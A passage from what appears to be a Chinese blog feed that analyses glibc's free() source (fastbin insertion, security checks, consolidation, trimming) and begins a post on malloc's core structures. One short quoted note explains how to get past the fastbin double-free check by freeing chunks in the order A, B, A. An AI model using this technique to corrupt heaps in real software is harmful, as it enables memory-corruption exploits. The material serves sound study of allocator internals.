class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br><br>  <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">     allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">     Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">     here by accident or by &quot;design&quot; from some intruder.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        __libc_lock_unlock (av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>  <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">     multiple of MALLOC_ALIGNMENT.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br></code></pre></td></tr></table></figure><h3 id="处理fast-chunk【if】"><a href="#处理fast-chunk【if】" class="headerlink" title="处理fast chunk【if】"></a>处理fast chunk【if】</h3><p>1、注意下面的have_lock是int_free的第三个参数，来表示是否有锁。如果没锁，下面会首先进行上锁，然后再进行操作；</p><p>2、安全检查：p的下一个chunk的大小是否合法，大小是否在范围内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs C">  check_inuse_chunk(av, p);<span class="hljs-comment">//这里如果没有开启debug模式这里是没用的</span><br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">    and used quickly in malloc.</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><span class="hljs-comment">//下面这个宏也是需要开启才能生效的情况，默认下是关闭的</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) &#123;<br><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))<br>  &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>  __libc_lock_lock (av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-keyword">if</span> (! have_lock)<br>  &#123;<br>    __libc_lock_unlock (av-&gt;mutex);<br>    locked = <span class="hljs-number">0</span>;<br>  &#125;<br>      &#125;<br><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br>    set_fastchunks(av);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>    fb = &amp;fastbin (av, idx);<br></code></pre></td></tr></table></figure><p>set_fastchunks是通过设置arena的flag标志位来表示fast bin中是含有chunk的</p><p><img src="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826170819299.png"></p><h4 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h4><p>目的很简单就是将p插入fast bin中</p><p>主要是下面一段的插入操作，首先old2是old的副本，p是要插入的chunk；</p><p>p-&gt;fd &#x3D; old2 &#x3D; old先将p-&gt;fd设置为old_chunk，并且做一个备份</p><p>下面这个原子操作注意：</p><p>catomic_compare_and_exchange_val_rel (fb, p, old2)) 这个函数目的就是想将p设置为fb的新值，主要操作就是如果fb当前的值是old2，就设置p为fb的当前值，然后返回fb更改之前的值，这样返回给old的即old2，然后old &#x3D; old2 !&#x3D; old2这个条件为假，就会退出循环；</p><p>如果fb当前的值和old2不等，可能被其他线程更改了，这样就不能设置p为fb的新值(因为要更新p-&gt;fd)，这样返回给old fb的当前值，old &#x3D; fb的当前值 !&#x3D; old2条件为真，进入while循环重新设置p-&gt;fd，然后继续这样的操作，直到p写进fb才结束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs C">  mchunkptr old = *fb, old2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>  <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">          (i.e., double free).  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>          &#123;<br>            errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br>        <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">          size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">          only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">          deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>          old_idx = fastbin_index(chunksize(old));<br>          <br>        p-&gt;fd = old2 = old;<br>    &#125;<br>  <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br>  <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>    &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>#原来的指向 FB –fd–&gt; OLD </p><p>#新插入的指向 FB –fd–&gt; P –fd–&gt; OLD</p></blockquote><p>出现的安全检查：</p><p>1、这里是主要检查double free，一个chunk不能被连续释放两次</p><p>2、chunk的size对应的idx要和fast bin的idx能对应上，即要将合适大小的chunk放到其对应的 fast bin中去</p><blockquote><p>#非法释放 FB –fd–&gt; A –fd–&gt; A </p><p>#逃过检查的方式：1、free(A); 2、free(B); 3、free(A) </p><p>FB –fd–&gt; A </p><p>FB –fd–&gt; B –fd–&gt; A </p><p>FB –fd–&gt; A –fd–&gt; B –fd–&gt; A</p></blockquote><h3 id="处理非fast-chunk【else-if】"><a href="#处理非fast-chunk【else-if】" class="headerlink" title="处理非fast chunk【else if】"></a>处理非fast chunk【else if】</h3><h4 id="安全检查-1"><a href="#安全检查-1" class="headerlink" title="安全检查"></a>安全检查</h4><p>上锁然后进行一系列的安全检查：</p><ul><li>看释放的chunk是否是top chunk</li><li>chunk是否超出了arena的边界，这里使用的比较符是&gt;&#x3D;top + sizeof(top)</li><li>通过next chunk看当前的chunk是否inuse，如果inuse为0，说明double free</li><li>然后就是判断nextchunk的size是否在范围内</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs C">      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123; <br><span class="hljs-keyword">if</span> (! have_lock) &#123;<br>          (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<br>          locked = <span class="hljs-number">1</span>;<br>        &#125;<br><br>        nextchunk = chunk_at_offset(p, size);<br><br>        <span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">          top block.  */</span><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<br>          &#123;<br>      errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br>        <span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>            &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>            &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>          &#123;<br>      errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br>        <span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<br>          &#123;<br>      errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br><br>        nextsize = chunksize(nextchunk);<br>        <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>      || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>          &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br></code></pre></td></tr></table></figure><h4 id="合并操作"><a href="#合并操作" class="headerlink" title="合并操作"></a>合并操作</h4><p>1、首先后向合并操作即试图和前面一个chunk进行合并，同时将前一个chunk进行unlink操作</p><p>2、然后前向合并即试图和后面一个chunk进行合并，这个需要保证后面一个chunk不是top chunk</p><ul><li>如果没有和后面一个chunk进行合并，就在nextchunk中设置inuse状态为0，即没有在用</li></ul><p>3、将该chunk放进unsorted bin中，首先是进行安全检查，保证双向链表是符合规范的</p><ul><li>bck为unsorted bin，fwd是bck-&gt;fd，要保证fwd-&gt;bk &#x3D;&#x3D; bck</li><li>每次向unsorted bin中插入新的chunk，都插在unsorted bin-&gt;fd位置</li><li>set_head主要用来设置size的pre_inuse字段，set_foot主要用来设置下一个chunk的pre_size字段</li></ul><p>4、如果前向合并是与top chunk进行合并，需要设置新的top chunk</p><p><img src="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826172303730.png"></p><p><img src="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826172308253.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  prevsize = p-&gt;prev_size;<br>  size += prevsize;<br>  p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>  unlink(av, p, bck, fwd);<br>&#125;<br><br><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      <span class="hljs-comment">/* get and clear inuse bit */</span><br>      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>      <span class="hljs-comment">/* consolidate forward */</span><br>      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>  unlink(av, nextchunk, bck, fwd);<br>  size += nextsize;<br>      &#125; <span class="hljs-keyword">else</span><br>  clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">  Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">  not placed into regular bins until after they have</span><br><span class="hljs-comment">  been given one chance to be used in malloc.</span><br><span class="hljs-comment">      */</span><br><br>      bck = unsorted_chunks(av);<br>      fwd = bck-&gt;fd;<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br>      p-&gt;fd = fwd;<br>      p-&gt;bk = bck;<br>      <span class="hljs-keyword">if</span> (!in_smallbin_range(size))<br>  &#123;<br>    p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>    p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>  &#125;<br>      bck-&gt;fd = p;<br>      fwd-&gt;bk = p;<br><br>      set_head(p, size | PREV_INUSE);<br>      set_foot(p, size);<br><br>      check_free_chunk(av, p);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">  consolidate into top</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">else</span> &#123;<br>  size += nextsize;<br>  set_head(p, size | PREV_INUSE);<br>  av-&gt;top = p;<br>  check_chunk(av, p);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="阈值收缩"><a href="#阈值收缩" class="headerlink" title="阈值收缩"></a>阈值收缩</h4><p>1、如果当前合并后的chunk大小已经达到触发合并操作阈值</p><ul><li>判断fast bin中是否有chunk，如果有则进行合并操作</li><li>如果是主分配区，最后是通过systrim来进行收缩的</li><li>非主分配区，是通过heap_trim来进行收缩的</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C">        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>          <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>      malloc_consolidate(av);<br><br>          <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;=<br>          (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<br>        systrim(mp_.top_pad, av);<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">        large, because the corresponding heap might go away.  */</span><br>      heap_info *heap = heap_for_ptr(top(av));<br><br>      assert(heap-&gt;ar_ptr == av);<br>      heap_trim(heap, mp_.top_pad);<br>          &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>          assert (locked);<br>          (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="处理map-chunk【else】"><a href="#处理map-chunk【else】" class="headerlink" title="处理map chunk【else】"></a>处理map chunk【else】</h3><p>调用munmap_chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">else</span> &#123;<br>    munmap_chunk (p);<br>  &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc源码分析</title>
    <link href="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="malloc源码解析"><a href="#malloc源码解析" class="headerlink" title="malloc源码解析"></a>malloc源码解析</h1><p>首先看下没有tcache 的glibc， 接着看下加入tcache的版本</p><h2 id="基础结构体"><a href="#基础结构体" class="headerlink" title="基础结构体"></a>基础结构体</h2><p>glibc是从系统中map一块内存，然后利用自己的结构体进行管理</p><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>在glibc中申请的块结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是各字段的位置以及含义<br><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826095121807.png"></p><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>我们在了解glibc的堆分配时可能会听到arena，其实就是下面的结构体，可以用来记录top、fastbin和bins的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  <span class="hljs-type">mutex_t</span> mutex;<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>glibc中堆分配时遇到的heap结构即下面的结构体：包含了前一个heap和当前heap的大小，还有就是当前heap的arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span><br>  <span class="hljs-type">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><h2 id="do-check的一些函数"><a href="#do-check的一些函数" class="headerlink" title="do_check的一些函数"></a>do_check的一些函数</h2><p>这部分主要就是在glibc开启debug模式下才会调用的函数，这里单独拿出来看下</p><h3 id="do-check-remalloced-chunk"><a href="#do-check-remalloced-chunk" class="headerlink" 